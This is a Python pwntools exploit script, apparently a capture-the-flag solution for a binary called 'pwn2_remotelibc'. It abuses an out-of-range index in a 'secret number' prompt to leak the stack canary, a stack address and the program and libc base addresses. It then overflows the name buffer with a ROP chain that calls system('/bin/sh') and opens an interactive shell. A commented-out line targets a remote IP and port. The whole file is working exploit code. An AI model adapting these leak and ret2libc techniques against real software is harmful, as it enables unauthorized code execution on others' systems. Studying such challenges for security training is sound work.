from pwn import *

context.arch = 'amd64'
 # context.log_level = 'debug'

exe = ELF('./pwn2_remotelibc')
libc = exe.libc

step = 4
count = 9
rand_rbp =-0x50

sum_rbp =-0x5C
canary_rbp =-0x8
main_rbp = 0x18
envp_rbp = 0x28
env_rbp = 0x7FFFFFFFD758- 0x7FFFFFFFD640 # 0x118
main_ret = 0x29D90 # libc.libc_start_main_return

buf_rbp =-0x20
buf = 24
read_buf = 256

# rop
def r(canary: bytes, rbp: int)-> bytes:
    r = ROP(libc, rbp + buf_rbp)
    r.raw(buf * b'A') # buf
    r.raw(canary) # canary
    r.raw(1) # old rbp
    r.raw(r.ret.address) # return address
    r.system(b'/bin/sh')
    # print(r.dump())
    return r.chain().ljust(read_buf)

io = process(exe.path)
# gdb.attach(io, 'b *main+281')
# io = remote('202.120.7.16', 29746)

 # 泄露rbp[rbp_offset:][:size]处的内存
def leak(rbp_offset: int, size: int)-> bytes:
    global count
    start = (rbp_offset - rand_rbp) // step
    stop = (rbp_offset - rand_rbp + size - 1) // step + 1
    count -= stop - start
    data = bytearray()
    for i in range(start, stop):
        io.sendline(str(i).encode())
        io.recvuntil(b'The secret number is ')
        rec = io.recvline(False)
        data.extend(int(rec).to_bytes(step, 'little', signed=True))
    return bytes(data[rbp_offset % step :][:size])

sum: int = u32(leak(sum_rbp, 4)) # 265349
log.success(f'sum: {sum}')

canary: bytes = leak(canary_rbp, 8)
log.success(f'canary: {hex(u64(canary))}')

main: int = u64(leak(main_rbp, 8))
log.success(f'main: {hex(main)}')
exe.address += main - exe.sym['main']

rbp: int = u64(leak(envp_rbp, 8))- env_rbp
log.success(f'rbp: {hex(rbp)}')

libc_base: int = u64(leak(0x8, 8))- main_ret
log.success(f'libc base: {hex(libc_base)}')
libc.address += libc_base

while count > 0:
    leak(rand_rbp, 4)

io.sendlineafter(b"Do you know what's the sum of the secret number?\n",
str(sum).encode())

io.sendlineafter(b'Please tell me your name:', r(canary, rbp))

io.interactive()